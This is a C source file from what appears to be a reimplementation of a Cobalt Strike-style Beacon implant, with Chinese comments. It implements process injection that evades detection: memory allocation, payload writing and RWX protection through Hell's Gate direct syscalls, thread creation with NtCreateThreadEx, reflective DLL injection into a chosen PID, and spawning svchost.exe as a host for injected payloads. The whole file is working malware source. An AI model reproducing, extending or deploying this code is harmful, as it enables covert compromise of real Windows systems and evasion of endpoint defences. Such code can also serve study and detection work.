#include "Util.h"
#include "Command.h"
#include "Job.h"
#include "GuangMing.h"
typedef struct
{
    HANDLE hProcess;
    HANDLE hThread;
    DWORD Process_PID;
    BOOL is_process_arch;
    BOOL Flag_FALSE;
    BOOL is_system_process;
    BOOL is_Process_self;
    BOOL ishThread;
}BeaconProcessInject;
/// <summary>
/// 初始化反射注入中的一些函数
/// </summary>
/// <param name="payload"></param>
/// <param name="pBeaconProcessInject"></param>
/// <param name="p_len"></param>

BOOL sub_100054CC(char* payload, int p_len)
{
    return p_len >= 51200 && *(WORD*)payload == 'ZM' && *((DWORD*)payload + 255) == 0xF4F4F4F4;
}
/// <summary>
/// 初始化BeaconProcessInject
/// </summary>
/// <param name="hProcess"></param>
/// <param name="pi"></param>
/// <param name="pid"></param>
/// <param name="pBeaconProcessInject"></param>
void sub_10004B81(HANDLE hProcess, PROCESS_INFORMATION* pi, int pid, BeaconProcessInject* pBeaconProcessInject)
{
    pBeaconProcessInject->hProcess = hProcess;
    pBeaconProcessInject->Process_PID = pid;
    pBeaconProcessInject->Flag_FALSE = 1;
    int v5 =1;
    int v6 = v5 == pBeaconProcessInject->Flag_FALSE;
    pBeaconProcessInject->is_process_arch = v5;
    pBeaconProcessInject->is_system_process = v6;
    pBeaconProcessInject->is_Process_self = pid == GetCurrentProcessId();
    if (pi)
    {
        pBeaconProcessInject->ishThread = 1;
        pBeaconProcessInject->hThread = pi->hThread;
    }
    else
    {
        pBeaconProcessInject->ishThread = 0;
        pBeaconProcessInject->hThread = 0;
    }
}


typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE sectionHandle,
    HANDLE processHandle,
    PVOID* baseAddress,
    ULONG_PTR zeroBits,
    SIZE_T commitSize,
    PLARGE_INTEGER sectionOffset,
    PSIZE_T viewSize,
    ULONG inheritDisposition,
    ULONG allocationType,
    ULONG win32Protect);


/// <summary>
/// 分配内存
/// </summary>
/// <param name="ProcessHandle"></param>
/// <param name="payload"></param>
/// <param name="Size"></param>
/// <returns></returns>


char* VirtualProtecAddress(size_t payload_size, BeaconProcessInject* pBeaconProcessInject, char* payload)
{
    // 分配远程内存的方式 VirtualAllocEx or NtMapViewOfSection
   /* if (pBeaconProcessInject->is_system_process)
    {*/
        
    SIZE_T  min_alloc = 1356;
    if (payload_size > min_alloc)
    {
        min_alloc = payload_size;
    }
    //LPVOID payloadaddr = RWXaddress();
    char* payloadaddr = 0;
    ULONG size = 1 << 18;
    SIZE_T buffSize1 = (SIZE_T)min_alloc;
    char* NtAllocateVirtualMemoryEx = "NtAllocateVirtualMemoryEx";
    DWORD SyscallNumber = GetSyscallNumber(NtAllocateVirtualMemoryEx,26);
    HellsGate(SyscallNumber);
    HellDescent(pBeaconProcessInject->hProcess, &payloadaddr, &buffSize1, MEM_COMMIT | MEM_RESERVE , PAGE_READWRITE ,NULL,0  );
    //char* payloadaddr = (char*)VirtualAllocEx(pBeaconProcessInject->hProcess, 0, min_alloc, 0x3000u, PAGE_READWRITE);
    //char* payloadaddr = (char*)payloadaddr;
    if (!payloadaddr)
    {
        BeaconErrorDD(0x1Fu, min_alloc, GetLastError());
        return 0;
    }
    int NumberBytes = 0;
    SIZE_T NumberOfBytesWritten = 0;
    ULONG flOldProtect = 0;
        
    if (payload_size > 0)
    {
        //NtWriteVirtualMemory
        char* NtWriteVirtualMemory = "NtWriteVirtualMemory";
        DWORD SyscallNumber = GetSyscallNumber(NtWriteVirtualMemory, 21);
        HellsGate(SyscallNumber);
           
        while (HellDescent(pBeaconProcessInject->hProcess, &payloadaddr[NumberBytes], &payload[NumberBytes], payload_size - NumberBytes, &NumberOfBytesWritten)==0)
        {
            NumberBytes += NumberOfBytesWritten;
            if (!NumberOfBytesWritten)
            {
                return 0;
            }
            if (NumberBytes >= payload_size)
            {
                //int userwx = get_short(44);
                    char* NtProtectVirtualMemory = "NtProtectVirtualMemory";
                    DWORD SyscallNumber = GetSyscallNumber(NtProtectVirtualMemory, 23);
                    HellsGate(SyscallNumber);
                    //NTSTATUS status = HellDescent(pBeaconProcessInject->hProcess, (PVOID*)&payloadaddr, &min_alloc, PAGE_EXECUTE_READWRITE, &flOldProtect);
                    if (HellDescent(pBeaconProcessInject->hProcess, (PVOID*)&payloadaddr, &min_alloc, PAGE_EXECUTE_READWRITE, &flOldProtect))
                    {
                        BeaconErrorD(0x11u, GetLastError());
                        return 0;
                    }
                    
                return payloadaddr;
            }
        }
        BeaconErrorD(0x10, GetLastError());
        return 0;
    }
   
       
    //}
    //else
    //{
    //    //result = sub_10005120(pBeaconProcessInject->hProcess, payload, payload_size);
    //    PVOID BaseAddress = 0;
    //    ULONG_PTR ViewSize = 0;
    //    int min_alloc = 16384;//.process-inject.min_alloc
    //    if (payload_size > min_alloc)
    //    {
    //        min_alloc = payload_size;
    //    }
    //   /* HMODULE ntdllbase = GetModuleHandleA("ntdll.dll");
    //    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdllbase, "NtMapViewOfSection");
    //    if (!NtMapViewOfSection)
    //    {
    //        return 0;
    //    }*/
    //    HANDLE FileMappingA = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, min_alloc, 0);
    //    if (FileMappingA != (HANDLE)-1)
    //    {
    //        PVOID payloadaddr = MapViewOfFile(FileMappingA, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    //        if (payloadaddr)
    //        {
    //            memcpy(payloadaddr, payload, payload_size);
    //            //int userwx = get_short(44); //.process-inject.userwx
    //            NtMapViewOfSection(FileMappingA, pBeaconProcessInject->hProcess, &BaseAddress, 0, 0, 0, &ViewSize, 1, 0, PAGE_READWRITE);
    //            UnmapViewOfFile(payloadaddr);
    //        }
    //        CloseHandle(FileMappingA);
    //    }
    //    if (!BaseAddress)
    //    {
    //        BeaconErrorD(0x49u, GetLastError());
    //    }
    //    return BaseAddress;
    //}
    /*return result;*/
}

BOOL BeaconCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
    return CreateRemoteThread(hProcess, 0, 0, lpStartAddress, lpParameter, 0, 0) != 0;
}

void BeaconReflectiveDLLInject(char* commandBuf, int lenn) {
    uint8_t pidd[4];
    uint8_t p_offsett[4];
    unsigned char* pendingRequeststart = commandBuf;
    unsigned char* dirPathLenBytesstart = commandBuf + 4;
    memcpy(pidd, pendingRequeststart, 4);
    memcpy(p_offsett, dirPathLenBytesstart, 4);
    DWORD pid = bigEndianUint32(pidd);
    int p_offset = bigEndianUint32(p_offsett);
    HANDLE hProcess = OpenProcess(1082u, 0, pid);
    int arch = Is_Wow64(hProcess);

    /*datap pdatap;
    BeaconDataParse(&pdatap, commandBuf, lenn);*/
    

    if (!arch == 1) {
        ProcessInject(pid, 0, hProcess, commandBuf+8, lenn, p_offset, 0, 0);
        CloseHandle(hProcess);
        return;
    }
    else
    {
        int Bufflen = 23;
        unsigned char result[23] = "process is x86 not X64";
        unsigned char* resultmemmory = (unsigned char*)malloc(31);
        memcpy(resultmemmory, result, 31);
        DataProcess(resultmemmory, Bufflen, 0);
        return;
    }

    /*unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
    unsigned char* dirPathBytesstart = commandBuf + 8;
    memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
    dirPathBytes[dirPathLen] = '\0';*/


}

void BeaconSpawn(char* payload, int payloadsize) {

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createjob();
    hReadPipe = Createpipe.hReadPipe;
    si = Createpipe.si;
    //ProcessInject(GetCurrentProcessId(), &pi, GetCurrentProcess(), payload, payloadsize, p_offset, arg, a_len);

    //注入到其他进程
    if (BeaconSpawnTemporaryProcess(1, 1, &si, &pi))
    {
        Sleep(0x64u);
        ProcessInject(pi.dwProcessId, &pi, pi.hProcess, payload, payloadsize, 0, 0, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
      

    }
}


int BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFOA* sInfo, PROCESS_INFORMATION* pInfo) {

    if (!CreateProcessA(
        NULL,
        "c:\\windows\\system32\\svchost.exe",
        NULL,
        NULL,
        TRUE,
        0x44u,
        NULL,
        NULL,
        sInfo,
        pInfo))
    {
        int LastError = GetLastError();

        return 0;
    }

}
int Inject(BeaconProcessInject* pBeaconProcessInject, int prepended_data_size, char* BaseAddress, LPVOID lpParameter , size_t* payloadsize)
{
    DWORD flOldProtect = 0;
    char* NtProtectVirtualMemory = "NtProtectVirtualMemory";
    DWORD SyscallNumber = GetSyscallNumber(NtProtectVirtualMemory, 23);
    HellsGate(SyscallNumber);
    //HellDescent(pBeaconProcessInject->hProcess, &payloadaddr, &buffSize1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);
    if (HellDescent(pBeaconProcessInject->hProcess, (PVOID*)&BaseAddress, payloadsize, PAGE_EXECUTE_READWRITE, &flOldProtect))
    {
        BeaconErrorD(0x11u, GetLastError());
        
    }
    //CreateRemoteThread(pBeaconProcessInject->hProcess, 0, 0, (LPTHREAD_START_ROUTINE)&BaseAddress[prepended_data_size], lpParameter, 0, 0);

    PHANDLE  hThread;
    char* NtCreateThreadEx = "NtCreateThreadEx";
    DWORD NtCreateThreadExNumber = GetSyscallNumber(NtCreateThreadEx, 17);
    HellsGate(NtCreateThreadExNumber);
    // 调用NtCreateThreadEx
    NTSTATUS status = HellDescent(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        pBeaconProcessInject->hProcess,
        (LPTHREAD_START_ROUTINE)&BaseAddress[prepended_data_size],
        (PVOID)lpParameter,
        FALSE, NULL, NULL, NULL, NULL);

}

char* InjectMe(size_t payload_size, char* payload)
{

    SIZE_T min_alloc = 45;
    if (payload_size > min_alloc)
    {
        min_alloc = payload_size + 1024;
    }
  
    //char* payloadAddress = (char*)RWXaddress();
    char* NtAllocateVirtualMemory = "NtAllocateVirtualMemory";
    DWORD SyscallNumber = GetSyscallNumber(NtAllocateVirtualMemory, 24);
    HellsGate(SyscallNumber);
    HANDLE hProcess = GetCurrentProcess();

    // 分配的虚拟内存的起始地址
    PVOID payloadAddress = NULL;

    // 分配的虚拟内存的保护属性
    ULONG Protect = PAGE_READWRITE;
    HellDescent(hProcess, &payloadAddress, 0, &min_alloc, MEM_COMMIT | MEM_RESERVE, Protect);

    //char* payloadAddress = (char*)VirtualAlloc(0, min_alloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (payloadAddress)
    {
        memcpy(payloadAddress, payload, payload_size);
        return payloadAddress;
        //return CheckMemoryRWX(payloadAddress, min_alloc) != 0 ? payloadAddress : 0;
    }
    else
    {
        BeaconErrorDD(0x1F, min_alloc, GetLastError());
        return 0;
    }
}

void InjectComply(size_t payload_size, BeaconProcessInject* pBeaconProcessInject, int prepended_data_size, char* payload, LPVOID lpParameter)
{
    char* BaseAddress;
    if (pBeaconProcessInject->is_Process_self)
    {
        BaseAddress = (char*)InjectMe(payload_size, payload);// 申请注入进程自身address
    }
    else
    {
        BaseAddress = VirtualProtecAddress(payload_size, pBeaconProcessInject, payload);// 申请注入远程进程address
        
    }
    if (BaseAddress)
    {
        if (!Inject(pBeaconProcessInject, prepended_data_size, BaseAddress, lpParameter, &payload_size))// 进程注入
        {
            BeaconErrorDD(0x48u, pBeaconProcessInject->Process_PID, GetLastError());
        }
        
        
    }

    
}

void ProcessInject(int pid, PROCESS_INFORMATION* pi, HANDLE hProcess, char* payload, size_t p_len, int p_offset, char* arg, int a_len)
{

    char* parameter_addr;
    BeaconProcessInject pBeaconProcessInject;
    sub_10004B81(hProcess, pi, pid, &pBeaconProcessInject);
    if (a_len <= 0)
    {
        parameter_addr = 0;
    }
    else
    {
        parameter_addr = VirtualProtecAddress(a_len, &pBeaconProcessInject, arg);

    }
  
    InjectComply(p_len, &pBeaconProcessInject, p_offset, payload, parameter_addr);

}

